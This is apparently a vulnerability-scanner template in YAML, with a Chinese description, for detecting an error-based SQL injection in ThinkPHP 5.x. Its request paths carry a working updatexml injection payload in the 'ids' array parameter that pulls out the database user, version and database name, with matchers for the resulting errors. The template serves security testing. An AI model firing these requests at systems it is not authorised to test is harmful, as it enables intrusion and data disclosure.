id: thinkphp-sqli
info:
  name: ThinkPHP SQL Injection (updatexml)
  severity: High
  description: |
    检测 ThinkPHP 5.x 版本中存在的 SQL 注入漏洞，利用 updatexml 函数进行报错注入。
    该漏洞通常存在于数组参数的 SQL 查询中。
  tags:
    - sqli
    - thinkphp
    - updatexml
  reference:
    - https://vulhub.org/#/environments/thinkphp/in-sqlinjection/

requests:
  - method: GET
    preconditions:
      methods: [GET]
    path:
      - "{{BaseURL}}/index.php?ids[0,updatexml(0,concat(0xa,{{payload}}),0)]=1"
    payload_sets:
      default:
        - "user()"
        - "version()"
      aggressive:
        - "user()"
        - "version()"
        - "database()"
    matchers:
      - type: word
        words:
          - "XPATH syntax error"
          - "updatexml"
        condition: or
        part: body
      - type: status
        status: [500]

  - method: GET
    preconditions:
      methods: [GET]
    path:
      - "{{BaseURL}}/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1"
    matchers:
      - type: word
        words:
          - "root@"
          - "localhost"
        condition: or
        part: body
